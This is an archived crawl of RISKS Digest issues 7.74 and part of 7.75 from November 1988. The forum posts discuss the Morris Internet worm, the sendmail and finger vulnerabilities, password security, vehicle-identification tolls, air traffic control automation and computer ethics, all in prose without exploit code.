Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-26</DOCNO>
<DOCOLDNO>IA012-000131-B035-75</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.74.html 128.240.150.127 19970217023740 text/html 24480
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:36:06 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 74</TITLE>
<LINK REL="Prev" HREF="/Risks/7.73.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.75.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.73.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.75.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 74</H1>
<H2> Thursday 10 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Air traffic control and safety margins 
</A>
<DD>
<A HREF="#subj1.1">
Steve Philipson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  UK vehicle-identification systems 
</A>
<DD>
<A HREF="#subj2.1">
Chaz Heritage
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: The Computer Jam -- How it came about 
</A>
<DD>
<A HREF="#subj3.1">
Mark W. Eichin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  The worm and the debug option 
</A>
<DD>
<A HREF="#subj4.1">
Steven Bellovin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Risks of unchecked input in C programs 
</A>
<DD>
<A HREF="#subj5.1">
Geoff Collyer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Worms/viruses/moles/etc. and the risks 
</A>
<DD>
<A HREF="#subj6.1">
Scott E. Preece
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Nonsecure passwords/computer ethics 
</A>
<DD>
<A HREF="#subj7.1">
Christine Piatko
</A><br>
<A HREF="#subj7.2">
 PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Phone-answerer/ voicemail security &amp; voice-encryption 
</A>
<DD>
<A HREF="#subj8.1">
David A. Honig
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  University computing 
</A>
<DD>
<A HREF="#subj9.1">
James A. Schweitzer
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Air traffic control and safety margins
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@aurora.arc.nasa.gov">
steve@aurora.arc.nasa.gov
</A>&gt;
</address>
<i>
Wed, 9 Nov 88 12:19:13 PST
</i><PRE>

In rISKS-7.72, Jeffrey Mogul, Computer science unencumbered by fears about
cutting safety margins, submitted some quotes from "Airport" magazine":

&gt;    Aviation Scientists in Britain, the US, France and West Germany are
&gt;    now working on a data-exchange system which would reduce or even
&gt;    eliminate the human element in air traffic control and in airport
&gt;    approach, landing and take-off-slot technique.

   I'm not sure what "approach, landing and take-off-slot technique" means
(this is not an expression in use in the field), but I can tell you that many
of us in the field do not see terminal area control being handled by computer
control in the forseeable future.  The "human element" provides levels of
redundancy, error checking, and distributed reasonablness checks that would
likely be lost in a computer controlled system.

&gt;    Machine-talking-to-machine would enable the system to improve
&gt;    perhaps five-fold, because the precise nature of computer science
&gt;    is unencumbered by fears about cutting safety margins too finely.  A
&gt;    cold dish of comfort, perhaps; one which will not be available until
&gt;    well after 2005.  And anyway, nobody knows yet how much such a system
&gt;    will cost.  But we all know who's going to pay for it, don't we?

   One of the most significant losses in such a system is the loss of the
"party line".  Each flight crew hears the ATC instructions issued to other
aircraft on the frequency (and in their general area), and can recognize
instructions that put two aircraft in conflict.  We may never have a system
where an aircraft is cleared for takeoff by computer, where other aircraft
would not be aware of the issuance of that clearance.  A ground computer to
single aircraft computer system would DECREASE safety, as flight crews would
lose the knowledge of the "big picture", i.e., what other aircraft are being
told to do, and what the general flow of traffic is.  (It is of tremendos
import to know that another aircraft has been cleared for takeoff while you are
taxiing on the same runway.)  There are also substantial questions on the
viability of text-based (as opposed to human voice based) communications with
the attendant transfer from auditory to visual task loads and it's impact on
visual traffic scan duties.

   The author of the article seems to believe that computer systems are
inherently more reliable and efficient than human systems, so we can solve our
congestion and safety problems in one fell swoop just by using computer
systems.  RISKS readers recognize the falicy of that position, as do aviation
safety researchers.  On the other hand, he also seems to believe that the
computer system will be terribly expensive.  and that we'll be paying more even
though we see a "five-fold" improvement in capacity.  Sounds like a technically
naive writer to me.

						Steve Philipson

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
UK vehicle-identification systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:"chaz_heritage.WGC1RX"@Xerox.COM">
"chaz_heritage.WGC1RX"@Xerox.COM
</A>&gt;
</address>
<i>
9 Nov 88 11:21:15 PST (Wednesday)
</i><PRE>

In his Fri, 4 Nov 88 01:43:49 PST <A HREF="/Risks/7.72.html">RISKS-7.72</A> contribution Dave Robinson writes:

&gt; Last night, no BBC's TOP GEAR programme, a device deliberately designed
to locate cars was described.
Essentially, it is a navigational aid designed to take into account traffic
congestion.&lt;

What Mr. Robinson did not mention (though it has been given scant treatment
by the UK media) was the scheme for 'privatising' roads. This is part of
the general policy of the UK Government that as little as possible of the
national infrastructure should be publicly owned.

Though not necessarily all roads would immediately be sold off to
speculators, the majority of tunnels, bridges and newly-constructed roads
would, were the necessary legislation to be passed, become, or remain,
privately owned.

The Government feel that the present method of collecting tolls is
antiquated and causes congestion at vital points such as the Dartford
Tunnel. They therefore have conceived an automatic toll-collection method,
based, they say, on Japanese practice.

Every vehicle in the country would have to be fitted with what is described
as an 'electronic number-plate'. Descriptions of this equipment are few,
vague and couched in the usual patronising
'you-couldn't-possibly-understand-this' terms. However, its principle
appears to be that of IFF (Identification: Friend or Foe?).

When the IFF-equipped vehicle is driven through a toll point, its IFF is
interrogated by devices installed in the road surface. It then transmits,
by some means, the vehicle's registration number to the interrogation
devices. These communicate directly with the road owner's computer system.
Clearly this computer system must either be connected to, or share a common
database with, the Driver and Vehicle Licensing Centre at Swansea, which
holds all records of registered vehicles. This would allow the road owner
to bill drivers automatically. The Government claim (as they are wont to do
in such cases) that this is 'what the majority of people want'. There has,
of course, been no suggestion that the interrogation devices might also be
connected to the Police National Computer, since such a suggestion would be
either what the Government call 'irresponsible journalism' (if it were not
demonstrably true) or a breach of the Official Secrets Acts (if it were).
However, were I a senior Police Officer, I would find it difficult to
refuse such an opportunity for what is fashionably described as
'pre-emptive policing'.

It would, of course, have to be made a crime to drive without an IFF
device, or with a faulty one (how one is supposed to establish that one's
IFF is working correctly - when its principle of operation is apparently a
secret -  is not clear).   

It is curious that the Government, ostensibly anxious to allow maximum
commercial freedom, should on the one hand declare their intention of
selling off the roads to private investors, and on the other hand prepare
to prescribe for those investors a national system of automatic vehicle
identification. Were I the owner of a road or bridge I should resent being
told by the Government that I had to use a particular,
Government-prescribed toll system (tollbooths still work, and they're
cheap!). One could almost draw the conclusion that something other than
commercial efficiency had prompted the Government's decisions in this
respect.

However, there cannot possibly be RISKS in this system, since, on the few
occasions when it is publicly mentioned, there is always a qualifying assurance
to the effect that 'the innocent have nothing to fear'. Why such assurances
should have to be made in connection with an automatic toll system - totally
unconnected, of course, with the security forces - is not clear.
                                                                      Chaz

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
re: NYT/Markoff: The Computer Jam -- How it came about
</A>
</H3>
<address>
Mark W. Eichin 
&lt;<A HREF="mailto:eichin@ATHENA.MIT.EDU">
eichin@ATHENA.MIT.EDU
</A>&gt;
</address>
<i>
Wed, 9 Nov 88 19:58:41 EST
</i><PRE>

The following paragraph from Markoff's article comes from a telephone
conversation he had with me at the airport leaving the Nov. 8 "virus
conference": 

&gt;   But Morris reasoned that another expert could defeat his program by sending
&gt;the correct answering signal back to the rogue. To parry this, Morris
&gt;programmed his invader so that once every 10 times it sent the query signal it
&gt;would copy itself into the new machine regardless of the answer.
&gt;   The choice of 1 in 10 proved disastrous because it was far too frequent. It
&gt;should have been one in 1,000 or even one in 10,000 for the invader to escape
&gt;detection.

	However, it is incorrect (I did think Markoff had grasped my
comments, perhaps not.) The virus design seems to have been to reinfect with
a 1 in 15 chance a machine already infected.
	The code was BACKWARD, so it reinfected with a *14* in 15
chance. Changing the denominator would have had no effect.

Mark Eichin &lt;eichin@athena.mit.edu&gt; SIPB Member &amp; Project Athena "Watchmaker"
						
</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
The worm and the debug option
</A>
</H3>
<address>
smb@research.att.com &lt;Steven Bellovin&gt; 
&lt;<A HREF="mailto:hector!smb">
hector!smb
</A>&gt;
</address>
<i>
Wed, 9 Nov 88 23:01:29 EST
</i><PRE>
Cc: manis@grads.cs.ubc.ca

Sorry -- in both Berkeley's and Sun's standard distribution, debugging comes
enabled.  That's perhaps defensible from Berkeley; they're distributing a
research system, to customers prone to tinker, and sendmail is certainly
complex enough to need lot's of debugging.  Nor can I necessarily criticize
it from Sun; it's often useful to be able to trace such a program.  The flaw
is not that debug mode was possible; rather, that sendmail's debug mode (a)
was accessible remotely; and (b) expanded the range of inputs accepted by
the program, rather than just providing extra trace data.  What's even more
amazing is the statement Eric Allman (the author of sendmail) was quoted in
the N.Y. Times as making:  that he added that code to get around restrictive
management policies.  That is, it was a deliberate back door, albeit one
with a nominally-limited intended scope.  10-Nov-88

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Risks of unchecked input in C programs
</A>
</H3>
<address>
&lt;<A HREF="mailto:geoff@utstat.UUCP">
geoff@utstat.UUCP
</A>&gt;
</address>
<i>
Thu 10 Nov EST 1988 03:13:37
</i><PRE>

A security bug in the 4.2BSD Unix finger daemon, which permitted its
invoker to obtain a shell with super-user privileges, was exposed during
the recent Internet worm discussion.  The bug was caused by use of the C
standard I/O routine "gets" which is a bug waiting to happen and which
should be stamped out.  (I have deleted gets from my standard I/O
implementation, and the folks at Bell Labs Research have deleted gets
from their C library.)  The bug was that the finger daemon used gets to
read a line of input from its network connection, and gets is unable to
check that the input line fits within the buffer handed to gets, so a
suitably-constructed line of input to the finger daemon steps on other
variables, confusing the finger daemon.

gets, as part of standard I/O, is a decade-old backward-compatibility
hack for compatibility with the Sixth Edition UNIX Portable I/O Library,
which was utterly replaced by standard I/O no later than 1979.  gets
takes one parameter, the input buffer into which a line of input from
the standard input stream is to be stored, and deletes any trailing
newline from the buffer.  Standard I/O contains an alternative to gets,
called fgets, which takes three parameters: an input buffer, its size in
bytes, and the stream to be read.  fgets does not strip trailing
newlines.  Converting programs from using gets to fgets is largely
mechanical, and stripping trailing newlines is trivial to code
yourself.  gets is inherently unsafe due to its inability to check for
overrun of the buffer provided to it.  There is no reason to use gets,
and there are good reasons to avoid gets.

Geoff Collyer	utzoo!utstat!geoff, geoff@utstat.toronto.edu

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Worms/viruses/moles/etc. and the risks
</A>
</H3>
<address>
Scott E. Preece
&lt;<A HREF="mailto:preece@xenurus.gould.com ">
preece@xenurus.gould.com 
</A>&gt;
</address>
<i>
Thu, 10 Nov 88 09:38:49 CST
</i><PRE>

  From: "Clifford Johnson" &lt;GA.CJJ@Forsythe.Stanford.EDU&gt;
&gt; As for the trends, despite first appearances, the "Star Wars" system
&gt; would greatly add to U.S. vulnerability rather than to security by
&gt; resting U.S.  strategic execution (as well as warning) upon a huge
&gt; network of systems, much harder to secure than the present execution
&gt; system.  The warning system also becomes much more complex.  The funded
&gt; National Test Bed is in essence the
&gt; development of such vulnerable networks for strategic warning and execution.

It's also interesting to note that many of the people defending the security of
the "really" secure systems pointed to their reliance on physical security --
the lack of network or remote access.  SDI, on the other hand, is going to
depend on space-based components which CANNOT be isolated from remote access.

scott preece, motorola urbana design center
uucp:	uunet!uiucuxc!mcdurb!preece

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Nonsecure passwords/computer ethics
</A>
</H3>
<address>
Christine Piatko
&lt;<A HREF="mailto:piatko@svax.cs.cornell.edu ">
piatko@svax.cs.cornell.edu 
</A>&gt;
</address>
<i>
Wed, 9 Nov 88 15:56:43 EST
</i><PRE>

I would like to point out that the users themselves can make their passwords
more secure by not using `obvious' (i.e. English word, easily available in the
dictionary) passwords.  At the moment it is too easy to encrypt dictionary
entries and compare them to password files.  People are told this all the time,
but there are many people who use words that can be found in the dictionary.
I'm sure the situation is similar at other sites (even for root passwords).
People pick WORDS because they are easy to remember.  A better technique, to
come up with safer password, is to pick a phrase and use the initial letters
and numbers:

  'A stitch in time saves nine' for the password asits9.

Perhaps a program should be run every so often to check if people have obvious
passwords and remind them to change them.  If the message is ignored the user
could be inconvenienced by having the administrator change the password for him.

Of course this does not address other issues, like the 'bug' in sendmail (which
seemed more like a door that someone left open for himself) or other issues of
system security.  But this is one measure that users can take to protect
themselves a bit.

In defense of the alleged culprit R. Morris, I would like to say that I know of
people at several universities who have had similar escapades, although on a
smaller scale.  In this case I agree that the 'prank' got out of hand, but
there are many such pranks going all the time at any system site. For some
reason these kinds of holes are fascinating to some pretty intelligent people.
I think their fascination should be put to good use tracking down such holes.
I don't hold out much hope for completely secure systems (I don't believe there
are break-in proof safes or unsinkable ships either).  However this should
emphasize the fact that we are a community that has to work together, and
sometimes that means learning some very hard lessons together.  If just one
site had been affected, would the sendmail bug have been fixed nationwide?
Evidently not, since from what I've seen on the net this bug was known about
for at least 2 years.

As a community we have a lot to learn about how to work together.  It is
interesting to see so many different perspectives on how 'secure' computers and
networks should be.  I have been amused by people saying that we should require
CS students to take an ethics course.  Is it really so clear in the entire
community what is and isn't ethical behavior?  Obviously not, since some people
think this 'worm' incident was merely stupid, while others think it was
unethical.  We in the computer science community need to figure out a code of
ethics dealing with breaking into systems, just as we as a society are still
figuring out how to deal with people who break into our homes.

Christine Piatko 
usual disclaimers here, and no, I didn't know rtm very well.

</PRE>
<HR><H3><A NAME="subj7.2">
Re: Nonsecure passwords/computer ethics
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:Neumann@KL.SRI.COM">
Neumann@KL.SRI.COM
</A>&gt;
</address>
<i>
Wed, 9 Nov 88 13:09:18 PST
</i><PRE>

But don't forget that passwords traversing Ethernets and Arpanets are
vulnerable even if they are difficult to guess.  The net communications are
unencrypted and capturable.  Many years ago someone wrote a simple
ID-and-password capture program on the Ethernet.  It still works.  In UNIX,
the /dev/mem vulnerability (a "feature" to some) can be used to capture
passwords in unencrypted form.  Even the Gould UTX/32S C2 version of Unix
still has that vulnerability.  The bottom line is this: beware of relying on
passwords.  By the way, for Unix folks, the AT&amp;T and Sun announcements of
vastly improved security (including multilevel security) should be of
considerable interest.  But they still don't solve all the problems.

     [Ironically, perhaps, it is the classical paper by Bob Morris (Sr.)
     and Ken Thompson, "UNIX Password Security: A Case History", Comm.
     ACM 22, 11 (November 1979), pp. 594-597, that really started the
     increased awareness about password vulnerabilities!]

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Phone-answerer/ voicemail security &amp; voice-encryption
</A>
</H3>
<address>
"David A. Honig" 
&lt;<A HREF="mailto:honig@bonnie.ICS.UCI.EDU">
honig@bonnie.ICS.UCI.EDU
</A>&gt;
</address>
<i>
Wed, 09 Nov 88 13:42:33 -0800
</i><PRE>

Unauthorized phone-answering-machine playback and unauthorized
centralized-voicemail message playback could be made more difficult by
encrypting the stored messages.  This could be done at the same time as data
compression preprocessing on digital systems.  (There are analog "encryption"
methods but these days everything's cheaper digitally...)

Of course, the original message could be bugged when recorded, and for
a central-voicemail system the encryption key would have to be sent
over the (unsecure) phone lines, so this is not a total solution.  But
it makes it harder for nosy voicemail sysops, including those with
warrants, to playback stored messages.  And it makes unauthorized
home-answering machine playback useless.

Encrypted voicemail and a more secure home answering machine most likely *are*
good selling points, so I will not be too surprised when they become
commercial.  Some of the (e.g., black) market desires these features now, and
when it becomes cheap, everyone will expect it.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
University computing (Re: <A HREF="/Risks/7.71.html">RISKS-7.71</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:"James_A._Schweitzer.STHQ"@Xerox.COM">
"James_A._Schweitzer.STHQ"@Xerox.COM
</A>&gt;
</address>
<i>
Thu, 10 Nov 88 10:23:19 PST
</i><PRE>

Peter, re: your comment that "But to assume that university computing should be
relatively wide open would be a serious mistake.  Unethical and other abuses
are not uncommon."(Sun, 6 Nov 88 22:01:17 PST).

At a professional meeting last week, we had a presentation by a university data
center manager on a Trojan Horse attack which had shut down his operation. The
last part of his talk was titled "Lessons Learned".  I was dumbfounded that
these "lessons" included only technical conclusions concerning security
controls. There was no thought of teaching the student users about computer
ethics and proper behavior once you are granted computer use privileges.

I told him I though it was similar to teaching a fifteen-year-old to drive a
car while neglecting to say anything about rules of the road, traffic signals,
and so forth.

Until the universities start telling people about proper behavior, they (and I
guess we) deserve what we get.

Jim Schweitzer

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.73.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.75.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-27</DOCNO>
<DOCOLDNO>IA012-000131-B035-93</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.75.html 128.240.150.127 19970217023820 text/html 22641
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:36:32 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 75</TITLE>
<LINK REL="Prev" HREF="/Risks/7.74.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.76.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.74.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.76.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 75</H1>
<H2> Friday 11 November 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Re: Risks of unchecked input in C programs 
</A>
<DD>
<A HREF="#subj1.1">
Bob Frankston
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  NY Computer Laws and the Internet Worm 
</A>
<DD>
<A HREF="#subj2.1">
Dave Bozak
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Ethics 
</A>
<DD>
<A HREF="#subj3.1">
Stan Stahl
</A><br>
<A HREF="#subj3.2">
 Christine Piatko
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Comments sought on proposed computer ethics course 
</A>
<DD>
<A HREF="#subj4.1">
Bob Barger
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  UK vehicle-identification systems 
</A>
<DD>
<A HREF="#subj5.1">
Douglas Jones
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  UK vehicle-id systems... Big Brother's new eyes? 
</A>
<DD>
<A HREF="#subj6.1">
Mike Hadjimichael
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: Phone-answerer/ voicemail security &amp; voice-encryption 
</A>
<DD>
<A HREF="#subj7.1">
Jonathan Kamens
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: Ultrasonic emissions a real problem 
</A>
<DD>
<A HREF="#subj8.1">
Travis Lee Winfrey
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Re: Risks of unchecked input in C programs
</A>
</H3>
<address>
&lt;<A HREF="mailto:bobf@lotus.UUCP">
bobf@lotus.UUCP
</A>&gt;
</address>
<i>
Fri Nov 11 14:35:06 1988
</i><PRE>

The point about "gets" having no way to assure that the supplied buffer is
sufficient is a serious deficiency through the current ANSI(!) C library in
routines such  as sprintfv and strcpy.  This is a sloppiness that might be
justifiable in a hacking environment but is very dangerous and inexcusable for
production programs.  I find it amazing that such interfaces persist into
product applications since what we have is an underspecified interface to
important system functions.

Of course, one could avoid using this part of the C library, but writing safe
code shouldn't be a matter of fighting the system, rather it should be an
expected use of the library.

Sorry if I seem so adamant about this but I've got to worry about supplying
complex software to millions of users who are quite inventive in novel ways to
(ab)use the software.
                                         Bob Frankston

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
NY Computer Laws and the Internet Worm
</A>
</H3>
<address>
Dave Bozak
&lt;<A HREF="mailto:dab@oswego.Oswego.EDU ">
dab@oswego.Oswego.EDU 
</A>&gt;
</address>
<i>
Fri, 11 Nov 88 11:23:17 est
</i><PRE>

	In regards to the recent Internet Worm, I am amazed that the
newspapers continually report that the FBI is not sure that any
laws were broken.  In New York State, as of November 1, 1987, the
penal law was amended to include a new article, 156, titled
"Offenses Involving Computers".  There are 2 relevant offenses.
	Section 156.05: Unauthorized use of a computer.  A person is
guilty of unauthorized use of a computer when he knowingly uses or
causes to be used a computer or computer service without authorization
and the computer utilized is equipped or programmed with any device
or coding system, a function of which is to prevent the unauthorized
use of said computer or computer system.  Unauthorized us of a 
computer is a class A misdemeanor.
	Section 156.10: Computer trespass.  A person is guilty of computer
trespass when he knowingly uses or causes to be used a computer or
computer service without authorization and: 1. he does so with
of any felony; or 2. he thereby knowingly gains access to computer
material.  Computer trespass is a class E felony.
	Clearly the design and release of a worm is a violation of
section 156.10.  The worm was released was intended to gain access to
machines without authorization and was designed to gain access to
material (host lists) for propagation of the worm.
	A felony is defined as an offense for which a sentence to a term
of imprisonment in excess of one year is authorized in the state.
	Now maybe I am missing something here, not being a lawyer...so
would learned colleagues please clarify the legal issues involved
in this particular case?

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 Ethics
</A>
</H3>
<address>
&lt;<A HREF="mailto: Stahl@DOCKMASTER.ARPA">
 Stahl@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Fri, 11 Nov 88 00:51 EST
</i><PRE>

It's interesting that after the generally in-synch technical discussions
re RTM's virus, unanimity breaks down when the subject turns to ethics.

Christine Piatko, on the one hand, questions whether we can define
computer ethics in the absence even of agreement over house break-ins.
Jim Schweitzer, on the other hand, suggests that there ought not be any
question about proper computer ethics; that computer ethics is not
dissimilar to traffic rules.

I suggest that the situation is both less complicated than Piatko
suggests and more so than Schweitzer does.  As for Piatko, I would hope
that as a society we agree that it is wrong to break into someone else's
home and, that whatever disagreement we might have, it is over the
punishment not the crime.  Schweitzer, I believe, risks trivializing
significant ethical issues because, when all is said and done, traffic
rules have nothing to do with ethics but are agreed upon protocols for
sharing roadways.

The critical bottom line, and it is one that shouts out to us in the
wake of the RTM worm, is that we absolutely must begin to take the
teaching of ethics seriously.  Some school districts are beginning to do
this and they are to be commended for it.  Perhaps if everyone were
exposed to ethics courses, beginning in the early grades and continuing
through computer ethics courses and business ethics courses, etc, then
it would be clear `in the entire community what is and what isn't
ethical behavior.'

Stan Stahl

</PRE>
<HR><H3><A NAME="subj3.2">
Re: insecure passwords/computer ethics
</A>
</H3>
<address>
Christine Piatko
&lt;<A HREF="mailto:piatko@svax.cs.cornell.edu ">
piatko@svax.cs.cornell.edu 
</A>&gt;
</address>
<i>
Fri, 11 Nov 88 11:37:38 EST
</i><PRE>

I forgot about electronic snooping. I was mostly thinking of the 'common
password list' that was found with the virus.  At least some of them were
actual passwords of people at Cornell that were common English words.

I didn't realize the Ethernet was wide open for such snooping.  Maybe that
will happen next.
                                         Christine

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
 Comments sought on proposed computer ethics course
</A>
</H3>
<address>
Bob Barger 
&lt;<A HREF="mailto:CFRNB@ECNCDC.BITNET">
CFRNB@ECNCDC.BITNET
</A>&gt;
</address>
<i>
Fri 11 Nov 1988 11:45 CDT
</i><PRE>

Eastern Illinois University has a two-semester-hour requirement for
senior year students of a seminar "organized around a particular
subject/issue important to contemporary society" which must be taken
in a field outside the student's major field of study. The following
is a seminar proposal on which comments/suggestions are sollicited:
COMPUTER ETHICS: This seminar will investigate current ethical
issues involving computers. There will be no class meetings, except
for the first and last sessions. Students will instead utilize
electronic bulletin boards on the university's mainframe computer
network to research and discuss issues.
Week:      Topic:
 1         Orientation to the course: initially, the seminar members
           will meet as a group in a traditional class setting for
           purposes of introduction, and explanation of course
           content, ethical paradigms, class procedures, and
           evaluation criteria.
2-14       Weekly on-line reading of such bulletin boards as
           "Discussion of Ethics in Computing" (ETHICS L) and the
           "Forum on Risks to the Public in Computers and Related
           Systems" (RISKS), weekly posted reactions to these
           readings, and posted comments on other students'
           reactions.
15         Final examination and course evaluation: the seminar
           members will reconvene as a group for the last meeting to
           allow for individual examinations and group reflection on
           the seminar experience.
Writing component:
   Students will compose a weekly 30-to-50 line reaction to their
   bulletin board readings. These reactions will be posted (i.e.,
   sent to the mainframe computer bulletin board set aside for
   members of this seminar). In their reaction, students will: 1)
   identify the particular publication or publications to which
